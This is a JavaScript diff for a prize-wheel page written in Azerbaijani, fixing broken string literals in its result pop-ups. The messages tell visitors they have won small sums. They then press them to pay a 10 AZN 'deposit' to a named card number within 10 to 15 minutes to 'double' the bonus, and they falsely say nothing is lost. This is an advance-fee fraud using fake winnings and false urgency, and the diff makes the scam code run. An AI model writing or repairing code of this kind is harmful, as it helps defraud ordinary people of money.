@@ -509,8 +509,7 @@ function showResultModalWithSpinNumber(selected, resp, spinNumberToday) {
     let instr = '';
 
     if (spinNumberToday === 1) {
-      instr = '🎉 1 AZN qazandın! İstərsən bir daha Çevir – növbəti çarx daha böyük qazanc gətirər.
- ';
+      instr = '🎉 1 AZN qazandın! İstərsən bir daha Çevir – növbəti çarx daha böyük qazanc gətirər.';
       const retryBtn = document.createElement('button');
       retryBtn.className = 'btn primary';
       retryBtn.innerText = '👉 Yenidən sına!';
@@ -520,8 +519,7 @@ function showResultModalWithSpinNumber(selected, resp, spinNumberToday) {
       });
       modalActions.appendChild(retryBtn);
     } else if (spinNumberToday === 2) {
-      instr = '🔥 Ümumi qazancın: 4 AZN
-💛 15 dəqiqə ərzində beh ödə → qazancın 2x = 8 AZN olsun!';
+      instr = '🔥 Ümumi qazancın 4 AZN 💛 15 dəqiqə ərzində beh ödə → qazancın 2x = 8 AZN olsun!';
       const takeBtn = document.createElement('button');
       takeBtn.className = 'btn';
       takeBtn.innerText = '8 AZN Endirimi Götür 💸';
@@ -536,18 +534,7 @@ function showResultModalWithSpinNumber(selected, resp, spinNumberToday) {
             saveState(sess.phone, st);
           }
         } catch (e) { console.warn(e); }
-        alert('🎉 Təbriklər! 4 AZN bonus qazandın!
-Bu gün şanslı tərəfdəsən ✨
-
-💡 İndi 10 AZN beh ödə → bonusun avtomatik 8 AZN-ə yüksəlsin!
-(Yəni 4 AZN də əlavə qazanırsan)
-
-⏳ Bonus yalnız 15 dəqiqə aktivdir.
-
-✔ Beh sonda çıxıldığından, əslində itirmirsiniz – qazancınız artır.
-   
-💳 Kart: 4169738838586760
-👤 Leyla M.....');
+        alert('🎉 Təbriklər! 4 AZN bonus qazandın! Bu gün şanslı tərəfdəsən ✨💡 İndi 10 AZN beh ödə → bonusun avtomatik 8 AZN-ə yüksəlsin! (Yəni 4 AZN də əlavə qazanırsan)⏳ Bonus yalnız 15 dəqiqə aktivdir. ✔ Beh sonda çıxıldığından, əslində itirmirsiniz – qazancınız artır. 💳 Kart: 4169738838586760 👤 Leyla M.....');
         closeResultModal();
       });
       const retryBtn = document.createElement('button');
@@ -560,10 +547,7 @@ Bu gün şanslı tərəfdəsən ✨
       modalActions.appendChild(takeBtn);
       modalActions.appendChild(retryBtn);
     } else if (spinNumberToday === 3) {
-      instr = '🔥 Təbriklər! Son çarxda ' + selected.name + ' qazandınız. 
-         ⏳ 10 dəqiqə ərzində beh ödə → 8 AZN endirim yenidən aktivləşsin,
-         ✔ Beh sonda çıxıldığından, əslində itirmirsiniz – qazancınız artır.
-         💳 Kart nömrəsi: 4169738838586760 , Kart sahibi: Leyla M....';
+      instr = '🔥 Təbriklər! Son çarxda ' + selected.name + ' qazandınız.⏳ 10 dəqiqə ərzində beh ödə → 8 AZN endirim yenidən aktivləşsin, ✔ Beh sonda çıxıldığından, əslində itirmirsiniz – qazancınız artır. 💳 Kart nömrəsi: 4169738838586760 , Kart sahibi: Leyla M....';
       const okBtn = document.createElement('button');
       okBtn.className = 'btn primary';
       okBtn.innerText = 'Bitir';
